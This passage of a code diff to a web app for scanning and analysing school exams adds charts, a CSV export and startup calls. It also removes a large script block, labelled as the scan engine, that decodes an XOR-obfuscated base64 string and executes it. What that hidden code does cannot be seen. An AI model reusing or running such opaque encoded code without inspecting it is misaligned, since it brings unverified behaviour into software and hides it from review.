+    const compCtx = document.getElementById('competencyChart');
+    if (compCtx && compStats.length > 0) {
+      chartInstances.competencyChart = new Chart(compCtx, {
+        type: 'bar',
+        data: {
+          labels: compStats.map(c => c.code),
+          datasets: [{ label: 'Competency Mastery %', data: compStats.map(c => c.mastery), backgroundColor: '#0ea5e9' }]
+        },
+        options: { indexAxis: 'y', scales: { x: { beginAtZero: true, max: 100 } } }
+      });
+    }
+
+    const rankCtx = document.getElementById('rankingChart');
+    if (rankCtx) {
+      chartInstances.rankingChart = new Chart(rankCtx, {
+        type: 'bar',
+        data: {
+          labels: sortedScans.slice(0, 15).map(s => s.name),
+          datasets: [{ label: 'Score %', data: sortedScans.slice(0, 15).map(s => s.percentage), backgroundColor: '#16a34a' }]
+        },
+        options: { scales: { y: { beginAtZero: true, max: 100 } } }
+      });
+    }
+  }
+
+  function exportItemAnalysisCsv() {
+    const examId = (document.getElementById('analyticsExamSelect')?.value || '').trim();
+    const rows = Array.from(document.querySelectorAll('#itemTable tbody tr'));
+    if (!examId || rows.length === 0) {
+      showCenterModal('No Item Analysis', 'Select an Exam ID with recorded scans first.', 'info');
+      return;
+    }
+    const lines = ['Item,Correct,Wrong,Mastery %,Difficulty (p),Level,Discrimination (D),Decision'];
+    rows.forEach(tr => {
+      const cols = Array.from(tr.children).map(td => `"${td.textContent.trim()}"`);
+      lines.push(cols.join(','));
+    });
+    downloadCsvFile(lines.join('\n'), `CPGHS_Item_Analysis_${examId}.csv`);
+  }
+
+  // =========================================================================
+  // 11. MODAL HELPERS & STARTUP
+  // =========================================================================
   function showCenterModal(title, msg, type = 'info') {
     const backdrop = document.getElementById('centerModalBackdrop');
     const box = document.getElementById('centerModalBox');
-    const iconEl = document.getElementById('centerModalIcon');
     const icons = { info: 'ℹ️', warning: '⚠️', danger: '🚫', success: '✅' };
     box.className = 'center-modal-box ' + type;
-    iconEl.textContent = icons[type] || 'ℹ️';
+    document.getElementById('centerModalIcon').textContent = icons[type] || 'ℹ️';
     document.getElementById('centerModalTitle').textContent = title;
     document.getElementById('centerModalMsg').textContent = msg;
     backdrop.classList.add('open');
@@ -1242,161 +2480,14 @@
     document.getElementById('centerModalBackdrop').classList.remove('open');
   }
 
+  initCrossPlatformPwa();
   initSecurityHashes();
   document.addEventListener('DOMContentLoaded', () => {
     restoreAllExamIdDropdowns();
+    restoreDestinationUiState();
+    addTosCompetencyRow('LC-1', '', '1-5');
+    renderScanHistoryTable();
   });
-</script>
-
-<!-- Core OMR Vision, QR, Local Scan History, Google Sheets Sync & CSV Export Engine -->
-<script>
-(function(){
-  var _k="CPGHS_OMR_2026_SHIELD";
-  var _d=atob("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